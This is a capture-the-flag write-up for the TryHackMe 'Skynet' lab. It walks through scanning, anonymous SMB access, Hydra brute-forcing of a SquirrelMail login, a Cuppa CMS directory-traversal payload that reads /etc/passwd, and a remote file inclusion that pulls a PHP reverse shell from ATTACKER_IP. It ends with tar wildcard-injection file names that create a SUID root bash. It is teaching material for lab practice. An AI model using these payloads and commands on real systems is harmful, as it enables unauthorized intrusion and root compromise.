
# TryHackMe | Skynet


![Skynet Image](thm-skynet.png)

☍ Room Link - "https://tryhackme.com/room/skynet"

## Introduction

This writeup walks through the "Skynet" challenge from TryHackMe. You'll follow a step-by-step journey from initial reconnaissance to full system compromise, including the real-world trial and errors encountered along the way.

**In this guide, you'll learn :**
- Basic enumeration techniques using **nmap** and **gobuster**
- SMB share enumeration
- Credential brute-forcing with **Burp Suite** and **Hydra**
- Exploiting vulnerable CMS applications
- Leveraging **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** vulnerabilities
- Examining system-wide cron jobs for privilege escalation opportunities
- Exploiting default system command behaviors to escalate privileges

Grab a coffee and let's get started! ☕

**📋 Machine Descriptions and Tasks -** 
- A vulnerable Terminator themed Linux machine.
- There are three questions and two flags (user flag and root flag) we have to collect.

**Note:** The target IP may change between examples due to machine restarts.

## Enumeration

First, I did basic nmap scan - 

**Nmap Scan Results : -** 
```shell
 ➥ $ nmap -sCV -p- 10.82.130.100

Nmap scan report for 10.82.130.100
Host is up (0.016s latency).
Not shown: 65529 closed tcp ports (conn-refused)

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL TOP CAPA PIPELINING UIDL AUTH-RESP-CODE RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IDLE listed more Pre-login capabilities ENABLE SASL-IR have post-login LOGIN-REFERRALS OK IMAP4rev1 LITERAL+ ID LOGINDISABLEDA0001
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds

```

**Command Explanation -** 
- **nmap** , network exploration tool and security / port scanner.
- **-sC** , for default script.
- **-sV** , for service/version info.
- **-p-** , to scan ports from 1 through 65535.
- read more "https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html"

From the above scan results - 
- **Port 22** : 'OpenSSH' server and The service is running on port 22.
- **Port 80** : 'Apache' web server.
- **Port 110** : 'Dovecot' mail server for email retrieval.
- **Port 143** : 'Dovecot' mail server for email management.
- **Port 139 & 445** : 'Samba' file sharing service (SMB).

Now, if we visit "http://10.82.130.100/" we will see this landing page - 
![Skynet Landing Page](thm-skynet-pic1.png)

No information there. So, I ran a **gobuster** scan to find hidden directories and analyse the website’s structure.

**Gobuster Scan Results -** 
```shell
 ➥ $ gobuster dir -u http://10.82.130.100/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.82.130.100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta           (Status: 403) [Size: 278]
.htaccess      (Status: 403) [Size: 278]
.htpasswd      (Status: 403) [Size: 278]
admin          (Status: 301) [Size: 314] [--> http://10.82.130.100/admin/]
config         (Status: 301) [Size: 315] [--> http://10.82.130.100/config/]
css            (Status: 301) [Size: 312] [--> http://10.82.130.100/css/]
index.html     (Status: 200) [Size: 523]
js             (Status: 301) [Size: 311] [--> http://10.82.130.100/js/]
server-status  (Status: 403) [Size: 278]
squirrelmail   (Status: 301) [Size: 321] [--> http://10.82.130.100/squirrelmail/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================

```

The "/admin" or "/config" pages shows "Forbidden". But, if we visit "/squirrelmail" it redirects to the "http://10.82.130.100/squirrelmail/src/login.php" page. Check the image below - 

![Skynet Login Page](thm-skynet-pic2.png)

We require credentials, but currently don't have any. Let's shift to enumerating the **SMB** service to see if we can gather more information from there.

### Enumerating SMB Shares

First, we are going to list available shares - 

```shell
 ➥ $ smbclient -N -L //10.82.130.100
 
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```

**Command Explanation -** 
- smbclient : smbclient is a client that can 'talk' to an SMB/CIFS server.
- -N : The -N option suppress password prompt.
- -L : Requests a list of available shares/services from the server, rather than connecting to a specific one.
- Finally two forward slashes "//" followed by the IP or hostname.

From the above scan results - 
- **print$** : A special administrative share used for printer driver storage.
- **anonymous** : This is a custom share that explicitly allows anonymous (guest) access.
- **milesdyson** : This is very likely a user's home directory share. It strongly suggests that a user named **milesdyson** exists on the system.
- **IPC$** : A special share used for inter-process communication (IPC).


Let's connect to the **'anonymous'** share with "-N" flag (no password). The server will automatically allow us a guest/anonymous session.

```shell
 ➥ $ smbclient //10.82.130.100/anonymous -N
 
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5830548 blocks available
smb: \> cd logs
smb: \logs\> dir
  .                                   D        0  Wed Sep 18 05:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5830548 blocks available

```

From the above output we can see a file named "attention.txt" and a folder "logs" inside it three log files. We can get those files in our local system by using "**get filename**" command.

Downloading the files - 
```shell
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
smb: \> cd logs\
smb: \logs\> get log1.txt 
getting file \logs\log1.txt of size 471 as log1.txt (4.6 KiloBytes/sec) (average 3.0 KiloBytes/sec)
smb: \logs\> get log2.txt 
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \logs\> get log3.txt 
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.7 KiloBytes/sec)
smb: \logs\> exit

```

Upon examining the contents of the files, we discovered the following :
- The **attention.txt** file contains the message : **"A recent system malfunction has caused various passwords to be changed. All Skynet employees are required to change their passwords after seeing this message. -Miles Dyson"**
- The **log1.txt** file is a wordlist containing 31 potential passwords.
- Both **log2.txt** and **log3.txt** are empty files with a size of 0 bytes.

Now that we have identified the username **milesdyson**, obtained a password list, and also a login page from our last **gobuster** scan (i.e., http://10.82.130.100/squirrelmail/src/login.php), we can proceed with the next steps.

## Exploitation

Now, we can use Burp Suite's Intruder to brute-force the password, or we can use Hydra. Since this password list is small, I will first demonstrate the Burp Suite method, followed by a detailed command explanation for Hydra.

But, before that let's capture the login request and analyse it in Burp Suite -

![Burp Suite Capture](thm-skynet-pic3.png)

For a brute-force attack in Burp Suite, capturing the login request is sufficient. However, when using Hydra, we must specifically note the following elements from the request:
- **Target Endpoint:** The request is a **POST** sent to `/squirrelmail/src/redirect.php` (Note that this differs from the `login.php` page we saw in the browser).
- - **Request Parameters:** The pattern is `login_username=milesdyson&secretkey=password`. We will need these parameter names for Hydra.
- **Failure Indicator:** The server's response for a failed login attempt.

### 1. Brute-forcing Using Burp Suite

Inside Burp Suite, right-click the captured login request and select **'Send to Intruder'**. Then, navigate to the **Intruder** tab where we need to configure the attack by setting the following options (refer to the image below) :

![Burp Suite - Intruder](thm-skynet-pic4.png)

After clicking **'Start Attack'**, Intruder will open a new window and attempt each password from the provided wordlist. Shortly after the attack begins, you will notice one request with a different **Status Code**, indicating a successful login attempt. Refer to the image below for a visual example.

![Cracked Password](thm-skynet-pic5.png)

**Question 1** : What is Miles password for his emails? (The above password is the answer to this question)
### 2. Brute-forcing Using Hydra

Now, let's check how can we get this using hydra - 

```shell
 ➥ $ hydra -l milesdyson -P log1.txt 10.80.141.243 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=Unknown user or password incorrect"
 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:1/p:30), ~2 tries per task
[DATA] attacking http-post-form://10.80.141.243:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=Unknown user or password incorrect

[80][http-post-form] host: 10.80.141.243   login: milesdyson   password: {PASSWORD_PLACEHOLDER}

1 of 1 target successfully completed, 1 valid password found

```

**Command Explanation -** 
- `-l`: Username (fixed value)
- `-P`: Password wordlist (variable input)
- `http-post-form`: Specifies we're attacking a POST form
- `/squirrelmail/src/redirect.php`: Target login page path
- `login_username=^USER^&secretkey=^PASS^`: Form parameters where `^USER^` and `^PASS^` are Hydra's injection points
- `F=Unknown user or password incorrect`: Failure string - Hydra knows a attempt failed when this message appears

## Further Enumeration

Now, if we visit "http://10.80.141.243/squirrelmail/src/webmail.php" and login with the username (milesdyson) and password (cracked password from above). We can see a mailbox with three mail in inbox. One of them contains "smb password" for user milesdyson. Other two are just a random string ("balls have zero to me to me to me to me to me to me to me to me to") and it's binary representation respectively.

**smb password (User - milesdyson) -** 

![SMB Password](thm-skynet-pic6.png)

Returning to the terminal, I used the compromised credentials for the user **milesdyson** to log into the SMB share named **milesdyson** that we discovered earlier. Inside, I found a folder called `notes` containing an interesting file named **important.txt**. 

![SMB Login](thm-skynet-pic7.png)

I downloaded **important.txt** file to my local machine using the `get important.txt` command from the SMB shell.

```shell
 ➥ $ cat important.txt 

1. Add features to beta CMS /45******yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

```

Well, we got another hidden directory. If we visit it we can see the below page. **This is the answer to question 2 - What is the hidden directory?**

![Myles Dyson Personal Page](thm-skynet-pic8.png)

I ran **gobuster** again using `$ gobuster dir -u http://10.80.141.243/45**********yd/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt` to enumerate it further and found another page "/administrator". Check the image below - 

![Administrator](thm-skynet-pic9.png)

I searched for 'Cuppa CMS' exploits online and found the relevant exploit on Exploit-DB: [https://www.exploit-db.com/exploits/25971](https://www.exploit-db.com/exploits/25971).

Alternatively, we can search for this exploit locally using `searchsploit`, which will yield the same result.

![Cuppa Exploit](thm-skynet-pic10.png)

If you have the Exploit-DB database installed (which `searchsploit` uses), you can read the full exploit file directly from : "/usr/share/exploitdb/exploits/php/webapps/25971.txt".

First, I tested for Local File Inclusion (LFI) using the following payload:  
`http://10.80.159.232/45********yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`

**Breakdown of the attack components:**
- **Vulnerable endpoint:** `/45********yd/administrator/alerts/alertConfigField.php`
- **Injection parameter:** `urlConfig`
- **Directory traversal payload:** `../../../../../../../../../etc/passwd`

The payload instructs the server to navigate from its current web root directory (typically `/var/www/html` on Linux systems) back to the filesystem root and read the `/etc/passwd` file.

![LFI](thm-skynet-pic11.png)
Well, we can read the system file as you can see from the above image.

## Initial Access

Now, let's attempt Remote File Inclusion (RFI). This requires several preparation steps:

1. **Prepare a Payload:** We need a PHP reverse shell file.
2. **Host the Payload:** We will serve this file locally using a Python HTTP server.
3. **Start a Listener:** We must start a netcat listener on the port specified in our reverse shell file.

In essence, we will host a PHP reverse shell that, when executed remotely by the target server, should connect back to our machine. If successful, we will receive a connection from the target.

This solves the **third question** - "What is the vulnerability called when you can include a remote file for malicious purposes?"

Refer to the images below for the setup and execution - 

Let's grab this excellent php reverse shell from here - "https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php". We have to change the `"$ip = '127.0.0.1';" to attacker ip (typically tun0), and "$port = 1234;" (if you want different port)`.

**Host the Payload and Start a Listener-** 

![Listener](thm-skynet-pic12.png)

The above image, Left side I started a http server and right side started a listener on port 4242.

Now, from the browser I have visited "http://10.80.159.232/45********yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP:8000/php-reverse-shell.php" like we did for the LFI but this time we are executing a remote file by the target server.

![Reverse Shell](thm-skynet-pic13.png)

Finally, we got a response from the target server as you can see in the above image.

![User Flag](thm-skynet-pic14.png)

We got the **user flag** inside "/home/milesdyson" directory.

## Privilege Escalation

Now, if we examine the `backups` directory, we find a shell script (`backup.sh`) that creates a backup of all content from the `/var/www/html` directory and saves it as `backup.tgz` in the `/home/milesdyson/backups` directory.

![Backup Script](thm-skynet-pic15.png)

Additionally, checking the system-wide cron jobs with `cat /etc/crontab` reveals that the `backup.sh` script runs every minute as the root user.

![Crontab](thm-skynet-pic16.png)

We do not have write permissions for the `backup.sh` script itself, but we can write to the `/var/www/html` directory where the tar command executes. Therefore, we will exploit the `*` wildcard in the tar command to execute our payload. Refer to the image below for detailed implementation.

![Custom Script](thm-skynet-pic17.png)

**Command Explanation :** 
1. **`echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > s.sh`**
    - Creates a shell script that copies the bash binary to `/tmp/bash` and sets the SUID bit, ensuring it always executes with root privileges.
2. **`chmod +x s.sh`**
    - Grants executable permissions to the script.
3. **`touch -- '--checkpoint=1'`**
    - Creates a file named `--checkpoint=1`.
4. **`touch -- '--checkpoint-action=exec=bash s.sh'`**
    - Creates a file named `--checkpoint-action=exec=bash s.sh`.

**What to expect ?**
- When the "backup.sh" script executes it runs the tar backup command.
- Tar sees all files including `--checkpoint=1`, `--checkpoint-action=exec=sh s.sh`, `s.sh`
- "`--checkpoint=1`" - This is actually a command line argument for tar to tell "Stop and check progress after every file". But we have created a file name with the same so when tar hit it it will get confused and treats it as a command line argument rather than a file name.
- "--checkpoint-action=exec=bash s.sh" - This tells the tar when hit the checkpoint execute the mentioned command here it's "bash s.sh". So basically, our custom script will execute at this point.

![Root Flag](thm-skynet-pic18.png)

We can now locate the bash binary in the `/tmp` directory. To obtain a root shell, we execute `/tmp/bash -p`. The `-p` flag is crucial as it prevents bash from dropping privileged permissions, allowing us to maintain root-level access.

Finally, we can navigate to the root user's home directory and retrieve the **root flag**.

